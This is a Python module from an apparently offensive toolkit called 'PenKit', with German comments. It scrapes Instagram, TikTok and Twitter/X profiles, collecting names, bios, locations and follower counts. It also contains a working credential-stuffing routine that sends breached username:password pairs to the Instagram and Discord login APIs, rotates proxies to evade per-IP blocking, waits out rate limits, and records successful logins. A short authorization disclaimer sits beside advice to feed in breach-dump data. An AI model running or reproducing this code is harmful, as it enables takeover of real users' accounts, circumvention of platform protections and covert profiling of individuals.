"""
PenKit Social Media OSINT — Profil-Aufklärung ohne Login.

Module:
  1. Instagram  — instaloader: Posts, Follower, Following, Stories, Highlights
  2. TikTok     — tiktok-scraper: Videos, Likes, Follower (kein Login nötig)
  3. Twitter/X  — Profil-Infos, Tweets, Follower via Nitter (kein API-Key)
  4. Credential Stuffing — Breach-Daten gegen Plattformen testen (mit Rate-Limit)

Braucht:
  pip3 install instaloader
  pip3 install tweety-ns        # Twitter ohne API
"""

from __future__ import annotations
import asyncio
import json
import shutil
import urllib.request
import urllib.parse
from typing import AsyncGenerator

from core.runner import CommandRunner
from core.output_dir import get as out_dir


# ── Instagram OSINT (instaloader) ─────────────────────────────────────────────

async def instagram_profile(username: str, download_posts: bool = False) -> AsyncGenerator[str, None]:
    """
    Lädt öffentliche Instagram-Profil-Infos via instaloader.
    Kein Login nötig für öffentliche Profile.
    """
    if not shutil.which("instaloader"):
        yield "\033[31m[!] instaloader nicht installiert.\033[0m"
        yield "    pip3 install instaloader --break-system-packages"
        return

    runner = CommandRunner()
    out = out_dir("osint") / "instagram" / username
    out.mkdir(parents=True, exist_ok=True)

    yield f"\033[1;36m[*] Instagram OSINT: @{username}\033[0m\n"

    # Nur Metadaten (kein Download aller Posts — zu groß)
    cmd = [
        "instaloader",
        "--no-pictures",
        "--no-videos",
        "--no-video-thumbnails",
        "--no-geotags",
        "--no-captions",
        "--stories",           # Stories sammeln (wenn öffentlich)
        "--highlights",        # Highlights
        "--tagged",            # Getaggte Posts
        "--igtv",
        f"--dirname-pattern={out}",
        f"profile/{username}",
    ]

    if not download_posts:
        cmd.insert(1, "--no-pictures")
        cmd.insert(1, "--no-videos")

    found_info = {}
    async for line in runner.run(cmd):
        line_s = line.strip()
        if "Full Name" in line or "Biography" in line or "Followers" in line or "Following" in line:
            yield f"\033[32m  {line_s}\033[0m"
        elif "Post" in line or "Saved" in line:
            yield f"\033[36m  {line_s}\033[0m"
        elif "error" in line.lower() or "private" in line.lower():
            yield f"\033[33m  {line_s}\033[0m"
        elif line_s:
            yield f"  {line_s}"

    # JSON-Profil-Datei auslesen falls vorhanden
    import glob, os
    json_files = list(out.glob("*.json"))
    if json_files:
        try:
            data = json.loads(json_files[0].read_text())
            node = data.get("node", data)
            yield "\n\033[1;36m[*] Profil-Details:\033[0m"
            for key in ("full_name", "biography", "edge_followed_by", "edge_follow",
                        "is_private", "is_verified", "external_url", "category_name"):
                val = node.get(key, "")
                if isinstance(val, dict):
                    val = val.get("count", "")
                if val:
                    yield f"  {key:<25} \033[33m{val}\033[0m"
        except Exception:
            pass

    yield f"\n\033[32m[✓] Daten gespeichert: {out}\033[0m"


async def instagram_followers(username: str, session_file: str = "") -> AsyncGenerator[str, None]:
    """Follower/Following-Liste (braucht eingeloggten Account)."""
    if not shutil.which("instaloader"):
        yield "\033[31m[!] instaloader nicht installiert.\033[0m"
        return

    runner = CommandRunner()
    out = out_dir("osint") / "instagram"
    out.mkdir(parents=True, exist_ok=True)

    yield f"\033[1;36m[*] Follower-Liste: @{username}\033[0m"
    yield "    (Benötigt eingeloggten Account für private Profile)\n"

    cmd = ["instaloader", "--followers", f"--dirname-pattern={out}"]
    if session_file:
        cmd += [f"--login", session_file]
    cmd.append(f"profile/{username}")

    async for line in runner.run(cmd):
        yield f"  {line}"


# ── TikTok OSINT ──────────────────────────────────────────────────────────────

async def tiktok_profile(username: str) -> AsyncGenerator[str, None]:
    """TikTok Profil-Infos via API (kein Login nötig für öffentliche Profile)."""
    yield f"\033[1;36m[*] TikTok OSINT: @{username}\033[0m\n"

    # TikTok API (inoffizielle Web-API)
    url = f"https://www.tiktok.com/@{username}"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "text/html,application/xhtml+xml",
    }

    try:
        req = urllib.request.Request(url, headers=headers)
        with urllib.request.urlopen(req, timeout=15) as resp:
            html = resp.read().decode(errors="replace")

            # Metadaten aus HTML parsen
            import re
            # Follower-Anzahl
            f_match = re.search(r'"followerCount":(\d+)', html)
            following_match = re.search(r'"followingCount":(\d+)', html)
            likes_match = re.search(r'"heartCount":(\d+)', html)
            video_match = re.search(r'"videoCount":(\d+)', html)
            name_match = re.search(r'"nickname":"([^"]+)"', html)
            bio_match = re.search(r'"signature":"([^"]*)"', html)
            verified_match = re.search(r'"verified":(true|false)', html)
            private_match = re.search(r'"privateAccount":(true|false)', html)

            if name_match:
                yield f"  Name:       \033[33m{name_match.group(1)}\033[0m"
            yield f"  Username:   \033[33m@{username}\033[0m"
            if bio_match and bio_match.group(1):
                yield f"  Bio:        \033[33m{bio_match.group(1)}\033[0m"
            if verified_match:
                v = "✓ Verifiziert" if verified_match.group(1) == "true" else "Nicht verifiziert"
                yield f"  Status:     \033[{'32' if 'Veri' in v else '90'}m{v}\033[0m"
            if private_match:
                p = "🔒 Privat" if private_match.group(1) == "true" else "🌍 Öffentlich"
                yield f"  Sichtbar:   \033[33m{p}\033[0m"
            if f_match:
                yield f"  Follower:   \033[32m{int(f_match.group(1)):,}\033[0m"
            if following_match:
                yield f"  Following:  \033[32m{int(following_match.group(1)):,}\033[0m"
            if likes_match:
                yield f"  Likes:      \033[32m{int(likes_match.group(1)):,}\033[0m"
            if video_match:
                yield f"  Videos:     \033[32m{video_match.group(1)}\033[0m"

            # Link zur Seite
            yield f"\n  URL: https://www.tiktok.com/@{username}"

            # Speichern
            data = {
                "username": username,
                "name": name_match.group(1) if name_match else "",
                "bio": bio_match.group(1) if bio_match else "",
                "followers": int(f_match.group(1)) if f_match else 0,
                "following": int(following_match.group(1)) if following_match else 0,
                "likes": int(likes_match.group(1)) if likes_match else 0,
                "videos": int(video_match.group(1)) if video_match else 0,
                "verified": verified_match.group(1) == "true" if verified_match else False,
                "private": private_match.group(1) == "true" if private_match else False,
            }
            out_file = out_dir("osint") / f"tiktok_{username}.json"
            out_file.write_text(json.dumps(data, indent=2))
            yield f"\n\033[32m[✓] Gespeichert: {out_file}\033[0m"

    except Exception as e:
        yield f"\033[31m[!] Fehler: {e}\033[0m"
        yield "    TikTok blockiert manchmal direkte Requests. Alternativ:"
        yield f"    Manuell: https://www.tiktok.com/@{username}"


# ── Twitter / X OSINT ─────────────────────────────────────────────────────────

async def twitter_profile(username: str, nitter_instance: str = "nitter.net") -> AsyncGenerator[str, None]:
    """
    Twitter/X Profil via Nitter (kein API-Key nötig).
    Nitter ist ein freier Twitter-Frontend ohne Tracking.
    """
    yield f"\033[1;36m[*] Twitter/X OSINT: @{username}\033[0m"
    yield f"    Nitter: {nitter_instance}\n"

    url = f"https://{nitter_instance}/{username}"
    headers = {"User-Agent": "Mozilla/5.0 (compatible; PenKit/3.0)"}

    try:
        req = urllib.request.Request(url, headers=headers)
        with urllib.request.urlopen(req, timeout=10) as resp:
            html = resp.read().decode(errors="replace")

        import re
        name_match    = re.search(r'<a class="profile-card-fullname"[^>]*>([^<]+)', html)
        bio_match     = re.search(r'<p class="profile-bio"[^>]*><[^>]*>([^<]+)', html)
        stats = re.findall(r'<span class="profile-stat-num">([^<]+)</span>', html)
        tweets_match  = re.search(r'(\d[\d,]*)\s*Tweets', html)
        joined_match  = re.search(r'Joined\s+([A-Z][a-z]+ \d{4})', html)
        location_match = re.search(r'<span class="profile-location"[^>]*>[^<]*<[^>]*>([^<]+)', html)

        if name_match:
            yield f"  Name:      \033[33m{name_match.group(1).strip()}\033[0m"
        yield   f"  Username:  \033[33m@{username}\033[0m"
        if bio_match:
            yield f"  Bio:       \033[33m{bio_match.group(1).strip()}\033[0m"
        if location_match:
            yield f"  Ort:       \033[33m{location_match.group(1).strip()}\033[0m"
        if joined_match:
            yield f"  Beitritt:  \033[33m{joined_match.group(1)}\033[0m"
        if len(stats) >= 3:
            labels = ["Tweets", "Following", "Follower"]
            for label, val in zip(labels, stats[:3]):
                yield f"  {label:<10} \033[32m{val.strip()}\033[0m"

        yield f"\n  URL: https://twitter.com/{username}"
        yield f"  Nitter: {url}"

        out_file = out_dir("osint") / f"twitter_{username}.txt"
        out_file.write_text(f"@{username}\n{url}\n" + "\n".join(stats))
        yield f"\n\033[32m[✓] Gespeichert: {out_file}\033[0m"

    except Exception as e:
        yield f"\033[31m[!] Fehler: {e}\033[0m"
        yield f"    Alternativ: https://nitter.net/{username}"


# ── Credential Stuffing ───────────────────────────────────────────────────────

PLATFORM_CHECK: dict[str, dict] = {
    "instagram": {
        "url":      "https://www.instagram.com/api/v1/accounts/login/",
        "method":   "POST",
        "data":     "username={user}&enc_password=#PWD_INSTAGRAM_BROWSER:0:{ts}:{pw}&queryParams=%7B%7D&optIntoOneTap=false",
        "success":  '"authenticated":true',
        "fail":     "The password you entered is incorrect",
        "headers":  {
            "X-CSRFToken": "missing",
            "X-Instagram-AJAX": "1",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/121.0",
            "X-Requested-With": "XMLHttpRequest",
            "Referer": "https://www.instagram.com/",
        },
        "note": "Instagram hat starkes Rate-Limiting + CAPTCHA nach ~3 Versuchen/IP",
    },
    "discord": {
        "url":     "https://discord.com/api/v9/auth/login",
        "method":  "POST",
        "json":    True,
        "data":    {"login": "{user}", "password": "{pw}", "undelete": False, "captcha_key": None},
        "success": '"token"',
        "fail":    "Invalid Form Body",
        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
        "note":    "Discord blockiert nach ~5 Versuchen pro IP",
    },
}


async def credential_stuff(
    platform: str,
    cred_file: str,
    proxy_file: str = "",
    delay: float = 3.0,
    stop_on_hit: bool = False,
) -> AsyncGenerator[str, None]:
    """
    Credential Stuffing — testet Breach-Credentials gegen eine Plattform.

    Wichtig:
      - Nur auf Konten die dir gehören oder für die du Erlaubnis hast
      - Delay von min. 3s um Lockouts zu vermeiden
      - Mit Proxy-Rotation (proxy_file) viel effektiver

    Tipp: Credentials aus HIBP/DeHashed → hier testen
    """
    import os, time

    if platform not in PLATFORM_CHECK:
        yield f"\033[31m[!] Plattform '{platform}' nicht unterstützt.\033[0m"
        yield f"    Verfügbar: {', '.join(PLATFORM_CHECK.keys())}"
        return

    if not os.path.exists(cred_file):
        yield f"\033[31m[!] Credential-Datei nicht gefunden: {cred_file}\033[0m"
        return

    cfg = PLATFORM_CHECK[platform]
    yield f"\033[1;36m[*] Credential Stuffing: {platform.upper()}\033[0m"
    yield f"    Note: {cfg['note']}\n"
    yield "\033[33m[!] Nur auf autorisierten Konten verwenden!\033[0m\n"

    # Credentials laden (Format: user:pass oder user@mail.com:pass)
    creds = []
    with open(cred_file) as f:
        for line in f:
            line = line.strip()
            if ":" in line:
                parts = line.split(":", 1)
                creds.append((parts[0], parts[1]))

    # Proxies laden
    proxies = []
    if proxy_file and os.path.exists(proxy_file):
        with open(proxy_file) as f:
            proxies = [l.strip() for l in f if l.strip()]

    yield f"  {len(creds)} Credentials geladen"
    yield f"  {len(proxies)} Proxies geladen"
    yield f"  Delay: {delay}s zwischen Versuchen\n"

    out_file = out_dir("passwords") / f"stuffing_{platform}_hits.txt"
    hits = []

    for i, (user, pw) in enumerate(creds, 1):
        yield f"\033[90m  [{i:>4}/{len(creds)}] {user[:30]:<30} ...\033[0m"

        try:
            import time as t
            ts = str(int(t.time()))

            # Request vorbereiten
            data_str = cfg.get("data", "")
            if isinstance(data_str, str):
                data_str = data_str.replace("{user}", urllib.parse.quote(user))
                data_str = data_str.replace("{pw}", urllib.parse.quote(pw))
                data_str = data_str.replace("{ts}", ts)
                post_data = data_str.encode()
            elif cfg.get("json"):
                payload = dict(cfg["data"])
                for k, v in payload.items():
                    if isinstance(v, str):
                        payload[k] = v.replace("{user}", user).replace("{pw}", pw)
                post_data = json.dumps(payload).encode()
            else:
                post_data = b""

            req = urllib.request.Request(cfg["url"], data=post_data, headers=cfg.get("headers", {}))

            # Proxy setzen
            if proxies:
                proxy = proxies[i % len(proxies)]
                import urllib.request as ur
                proxy_handler = ur.ProxyHandler({"https": proxy, "http": proxy})
                opener = ur.build_opener(proxy_handler)
                resp_data = opener.open(req, timeout=8).read().decode(errors="replace")
            else:
                with urllib.request.urlopen(req, timeout=8) as resp:
                    resp_data = resp.read().decode(errors="replace")

            if cfg["success"] in resp_data:
                hits.append(f"{user}:{pw}")
                yield f"\033[1;32m  [HIT!] {user} : {pw}\033[0m"
                if stop_on_hit:
                    break
            elif cfg["fail"] in resp_data:
                pass  # normaler Fehlschlag
            else:
                yield f"\033[33m  [?] Unbekannte Antwort für {user}\033[0m"

        except urllib.error.HTTPError as e:
            if e.code == 429:
                yield f"\033[31m  [RATE-LIMIT] IP geblockt — warte 30s...\033[0m"
                await asyncio.sleep(30)
            elif e.code in (401, 403):
                pass  # falsche Credentials
            else:
                yield f"\033[31m  [HTTP {e.code}] {user}\033[0m"
        except Exception as e:
            yield f"\033[31m  [ERR] {user}: {e}\033[0m"

        await asyncio.sleep(delay)

    if hits:
        out_file.write_text("\n".join(hits))
        yield f"\n\033[1;32m[✓] {len(hits)} gültige Credentials gefunden!\033[0m"
        yield f"\033[32m    Gespeichert: {out_file}\033[0m"
        for h in hits:
            yield f"  \033[32m✓ {h}\033[0m"
    else:
        yield f"\n\033[33m[~] Keine gültigen Credentials gefunden ({len(creds)} versucht).\033[0m"
